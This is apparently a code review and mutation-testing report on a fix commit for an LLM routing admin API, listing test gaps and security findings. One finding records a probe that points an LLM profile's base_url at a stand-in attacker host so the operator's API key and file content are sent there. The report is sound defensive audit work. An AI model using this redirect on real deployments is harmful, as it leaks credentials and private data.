# PR-3 round 2: fix commit `d96f84ad`

Reviewed tree: `d96f84ad8465f855e5d171d3ed0ee03b4fe68df3` (parent `1668203d`), worktree `scratchpad/wt-intel-pr3r2`. Read alongside `9dae54c7`, `1668203d` and the round-1 file.

Baseline full suite at `d96f84ad`: `2929 passed, 2 skipped`.

Mutation set (unless noted): `test_admin_router.py test_llm_routing.py test_vision_worker.py test_video_visual_worker.py test_llm_caller_inventory.py`. Tree restored with `git checkout -- .` after each.

## Verification of the round-1 decisions

| R1 item | Decision | Closed? | Reproducing mutation | Result |
|---|---|---|---|---|
| F1 | `api_key_env` must match `^LLM_API_KEY(_[A-Z0-9]+)*$` in `build_routing` | yes | N1 regex → `.+` | killed (4: PUT row + 3 `build_routing` rows) |
| | | | N2 regex → `^LLM_API_KEY.*$` | killed (1, `LLM_API_KEYS` row) |
| F2 | legacy `api_key_present` from the effective key | yes | N4 → `os.getenv("LLM_API_KEY")` | killed (1) |
| F3 | view carries legacy `agentic` | yes | N5 drop the `agentic` line | killed (1) |
| F4 | PUT drops view-only keys | yes, code; test only half holds it | N6 do not strip | killed (1) |
| | | | N7 strip for validation but write the unstripped `payload.profiles` | **survived** (R2-F1) |
| F5 | exposure through `describe_route` (shared `_assigned`/`_after_policy`/`_serve`); `VISION_FEATURES` in the resolver | yes | N11 `describe_route` ignores `_serve` | killed (1) |
| | | | N12 always `sends` / N13 Defer → `skips` / N21 exposure passes `"allowed"` | killed (3 / 3 / 1) |
| | | | N8 drop `video_visual_index` from `VISION_FEATURES` / N9 drop `vision_describe` / N10 `needs_vision = False` | killed (2 / 3 / 2) |
| F7 (cap) | 64 KB cap on the PUT body | yes | N15 measure only `profiles` / N16 cap ×10 | killed (1 / 1) |
| F8 (tests) | DELETE notify, `output_language_restart_pending` | partly | N18 invert the GET flag | killed (1) |
| | | | N22 DELETE never notifies | killed (1) |
| | | | N17 DELETE notifies unconditionally (= R1 M10) | **survived** (R2-F2) |

Independent parity check (probe, not committed): a 180-case grid of assigned profile {offhost/on-host × vision/no vision × enabled/disabled} × fallback {none, on-host with/without vision, disabled} × verdict {allowed, denied, unknown} × feature {summaries, vision_describe, video_visual_index}. For every case `describe_route(feature, verdict, d)` equals the class of `await resolve(d, feature)` (Defer→unknown, Skip→skips, assigned→sends, fallback→falls_back): 180 passed. No disagreeing input found.

`vision=` removal: at `1668203d` the only callers passing `vision=True` were `workers/vision.py:568,739` (`vision_describe`) and `workers/video_visual.py:528,786` (`video_visual_index`); both features are in `VISION_FEATURES`, so they keep the check. No caller passed `vision=False` (or omitted it) for either vision feature; `resolve_without_ceiling` has one caller (`evals/__main__.py`, `"rag"`). No behaviour change for any caller (`git grep` at both SHAs).

## Mutation table

| id | file | mutation | want | result |
|---|---|---|---|---|
| N1 | `llm_routing.py` | `_API_KEY_ENV_RE` → `.+` | kill | killed (4) |
| N2 | `llm_routing.py` | → `^LLM_API_KEY.*$` | kill | killed (1) |
| N3 | `llm_routing.py` | `fullmatch` → `match` (pattern keeps `$`, so only a trailing `\n` differs; `_validate_llm` already rejects `\n`) | live | survived, as expected |
| N4 | `admin.py` `_llm_view` | legacy `api_key_present` from env only | kill | killed (1) |
| N5 | `admin.py` `_llm_view` | drop legacy `agentic` | kill | killed (1) |
| N6 | `admin.py` PUT | do not strip view-only keys | kill | killed (1) |
| N7 | `admin.py` PUT | validate the stripped profiles, write `payload.profiles` | kill | **survived** |
| N8 | `llm_routing.py` | `VISION_FEATURES` without `video_visual_index` | kill | killed (2, video-visual worker tests) |
| N9 | `llm_routing.py` | `VISION_FEATURES` without `vision_describe` | kill | killed (3) |
| N10 | `llm_routing._serve` | `needs_vision = False` | kill | killed (2) |
| N11 | `describe_route` | do not consult `_serve` | kill | killed (1) |
| N12 | `describe_route` | always `sends` | kill | killed (3) |
| N13 | `describe_route` | Defer → `skips` | kill | killed (3) |
| N14 | `describe_route` | assignment Skip → `sends` | live (exposure only calls it for an assigned off-host profile, so the branch is unreachable from the route) | survived, as expected |
| N15 | `_validate_llm` | cap measures `profiles` only | kill | killed (1) |
| N16 | `admin.py` | cap 640 KB | kill | killed (1) |
| N17 | DELETE | notify unconditionally | kill | **survived** |
| N18 | `_llm_view` | `output_language_restart_pending` inverted | kill | killed (1) |
| N19 | `resolve` | skip `_after_policy` | kill (inv 1) | killed (6) |
| N20 | `_after_policy` | denied returns the off-host profile instead of the fallback | kill (inv 1) | killed (4) |
| N21 | exposure | pass `"allowed"` instead of the looked-up verdict | kill | killed (1) |
| N22 | DELETE | never notify | kill | killed (1) |
| N23 | `_serve` | ignore `client.enabled` | kill | killed (4) |

## Findings

### R2-F1 — the round-trip test does not check that the saved routing is valid [introduced] — Low (test gap on F4)

N7 writes the unstripped `payload.profiles` to `llm-overrides.json` while validating the stripped copy. Probe with N7 applied: PUT `_ROUTED`, GET, PUT the GET `profiles`/`routing` → `200`, then `current_routing().error == "llm.profiles.local has unknown keys ['api_key_present']"`, i.e. every LLM feature skips after a save that reported success. `test_llm_get_body_can_be_saved_back_unchanged` stays green because it checks only the status and `saved["local"]["agentic"]` (the GET view shows raw stored profiles even when the routing is disabled). The code at `d96f84ad` is correct (writes `profiles`); the property is unguarded.

Suggested fix (not applied): add `assert llm_routing.current_routing().error is None` (or GET `error is None`) to that test.

### R2-F2 — the DELETE notify gate is still unguarded [introduced] — Low (F8 part not fully closed)

The new `test_llm_restart_is_reported_until_the_language_is_applied` holds the positive branch (N22 killed) but no test asserts DELETE does **not** notify when no restart is owed; N17 (the R1 M10 mutation) still survives. Effect of the mutation: every DELETE raises the core restart banner.

Suggested fix: in `test_llm_delete_returns_to_the_yaml_immediately`, assert the notify mock was not awaited and `restart_required is False`.

### R2-F3 — the admin can still send an operator's LLM key to a URL of its choice [pre-existing class; widened by `9dae54c7`] — Low under the personal-tool premise

Asked directly: a profile with `base_url: http://evil.example/v1`, `api_key_env: LLM_API_KEY`, `offhost: false` → `PUT /admin/llm` 200, `current_routing().profiles["x"].config == (base_url "http://evil.example/v1", api_key "sk-test")` (probe). The next call of any feature on any drive sends the real key as `Authorization: Bearer` there; `offhost: false` also means no `llm_cloud` ceiling applies, so file content from `llm_cloud: false` drives goes with it.

- At `0645dfa`, `LLMUpdate` already had `base_url`, and `load_settings` applied `LLM_API_KEY` over the merged YAML + GUI section (`config.py:1063-1068` there), so sending `LLM_API_KEY` to an admin-chosen URL is **pre-existing**, not introduced by this change.
- What `9dae54c7` adds: (a) every operator-set `LLM_API_KEY_<NAME>` (a key the operator bound to one endpoint in YAML) can now be re-pointed too; (b) `offhost` is GUI-writable, so the admin can declare a cloud URL on-host. The same master viewer can edit `drives.json` addon policy in core `/admin/settings`, so (b) is not above the admin's existing power; with `passwords.json` absent or `[]` anyone on the LAN is that admin, which is the accepted premise.
- The F1 fix closes the escalation to non-LLM secrets: a literal `api_key` in a profile → 400 `unknown keys ['api_key']`; top-level `api_key` / `api_key_env` / `base_url` in the PUT body are ignored by `LLMUpdate` (probe: keys stay `{'local': '', 'cloud': 'sk-cloud'}` with `CORE_INTERNAL_SECRET` set); no compose file, `configure.py` or doc under the repo sets any `LLM_API_KEY_*` name (grep), and the intelligence app sets no env names of that shape.

Supervisor to bucket. Suggested direction if it is to be narrowed: bind each `LLM_API_KEY_<NAME>` to a base URL the operator declares (env/YAML), and refuse a GUI profile that pairs a key with a different URL; otherwise record it in `known-issues.md`.

## Checked, no finding

- Cap and stripping vs legitimate saves: 16 profiles with a 1.5 KB `base_url` and 600-char models each → 200 (≈43 KB). The cap is measured on `json.dumps` with `ensure_ascii`, so non-ASCII counts ~2.7× (16 profiles with Japanese model names: 22,758 counted vs 8,358 real) — still far from 64 KB for any plausible config. A full legacy GET body (including `legacy`, `features`, `error`, ... at the top level) PUT back → 200, `error is None`: unknown top-level keys are ignored by `LLMUpdate`. Only `api_key_present` is stripped, and it is the only derived key GET puts inside a profile.
- The cap runs after FastAPI parsed the body; it bounds what is persisted and echoed, not request memory (acceptable, the route is admin-only).
- F1 in YAML: a profile with a non-`LLM_API_KEY*` `api_key_env` now disables the whole routing with a clear error. Profiles are on `main` since PR-1 but not documented in `search-config.yml.example` or `docs/`, so no documented config breaks; worth one line in the upgrade notes.
- `api_key_present` as an env oracle: in v2 it is computed only for names in saved profiles, which PUT now limits to `LLM_API_KEY*`; other names can only come from an operator-edited YAML.
- Exposure reads `current_routing()` once and `describe_route` calls `_current()` per cell across the `lookup_feature` awaits; a PUT landing mid-request could mix two routings in one response. Display only, self-corrects on reload.
- The `use_llm` conftest fake now derives `vision` from `llm_routing.VISION_FEATURES`, so the worker tests' `asked.vision` assertions follow the constant (detector rule 5). The resolver's own vision check is still held by `test_llm_routing` for `vision_describe` (N9/N10 killed there) and for `video_visual_index` only via the worker tests (N8). Not a defect.

## Trajectory

Diffs read in order: `9dae54c7` (feature), `1668203d` (test), `d96f84ad` (this fix).

This round **removed** one prediction and **added** guards:
- Removed: the `vision=` argument, a prediction every caller had to make about the resolver (four call sites), now owned by the resolver; and the exposure route's own copy of the routing decision (`allowed/denied/unknown → sends/falls_back/skips`), now answered by the same helpers as `resolve` — the 180-case grid shows no divergence.
- Added: the `api_key_env` pattern (a validation branch), the body-size branch, two view fields, and `_LLM_VIEW_ONLY_KEYS` — a prediction PUT now carries about what GET adds to each profile. That last one is the patch-shaped item: R1 offered keeping key status out of the profile dicts, which would need no prediction; the chosen shape has to be kept in step with `_llm_view` by hand, and R2-F1 shows the test does not yet hold it.

There is only one fix round so far, so there is no "two rounds in a row" to report. Net shape: converging on routing (F5), additive on the admin surface.

TOTAL: 3 findings
